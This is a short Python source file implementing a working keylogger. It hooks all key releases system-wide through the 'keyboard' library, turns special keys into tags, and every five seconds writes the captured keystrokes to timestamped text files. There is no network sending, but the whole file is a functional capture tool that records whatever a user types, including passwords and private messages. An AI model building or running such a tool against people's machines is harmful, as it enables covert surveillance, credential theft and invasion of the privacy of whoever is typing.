import keyboard
from threading import Timer
from datetime import datetime

SEND_REPORT_TIME = 5
LANGUAGE = 'RUSSIAN'

class Keylogger:
    def __init__(self, time_interval, report_method='file'):
        self.time_interval = time_interval
        self.report_method = report_method
        self.log = ''
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == 'space':
                name = ' '
            elif name == 'enter':
                name = '[ENTER]\n'
            elif name == 'decimal':
                name = '.'
            else:
                name = name.replace(' ', '_')
                name = f'[{name.upper()}]'
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace("-", "_").replace(":", " ")
        end_dt_str = str(self.end_dt)[:-7].replace("-", "_").replace(":", " ")
        self.filename = f"Keylog--{start_dt_str}--{end_dt_str}--"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == 'file':
                self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ''
        timer = Timer(interval=self.time_interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

if __name__ == '__main__':
    keylogger = Keylogger(time_interval=SEND_REPORT_TIME, report_method='file')
    keylogger.start()
